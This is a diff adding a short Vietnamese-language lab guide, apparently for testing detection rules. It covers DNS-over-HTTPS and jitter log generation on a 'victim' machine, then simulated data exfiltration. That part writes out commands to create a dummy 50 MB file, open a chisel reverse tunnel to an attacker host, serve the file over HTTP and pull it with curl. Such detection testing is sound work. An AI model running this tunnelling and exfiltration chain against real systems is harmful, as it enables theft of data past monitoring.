@@ -1,0 +1,20 @@
+1. DNS over HTTPS, Connection with Jitter, No DNS connection
+  - Chạy file log_gen1.ps1 trên máy victim, sửa địa chỉ ip nếu cần.
+      Command:
+        "Set-ExecutionPolicy Unrestricted -Scope Process
+        .\scripts\log_gen1.ps1"
+  - Thực hiện các câu truy vấn trong /rule. 
+
+2. Data Exfiltration
+  - Tạo file giả lập dữ liệu.
+      Command:   
+        "fsutil file createnew C:\Users\Public\test_50mb.dat 52428800"
+  - Dựng chisel client và http server
+      Command:    
+        ".\chisel.exe client 172.25.0.20:8080 R:9999:127.0.0.1:8080
+          cd C:\thư mục chứa file data\ && python -m http.server 8080"
+
+  - Trên máy Attacker Dựng Chisel Server và thực hiện kéo file
+      Command:   
+        "./chisel server -p 8080 --reverse
+          curl [http://127.0.0.1:9999/test_50mb.dat](http://127.0.0.1:9999/test_50mb.dat) -o test_50mb.dat"
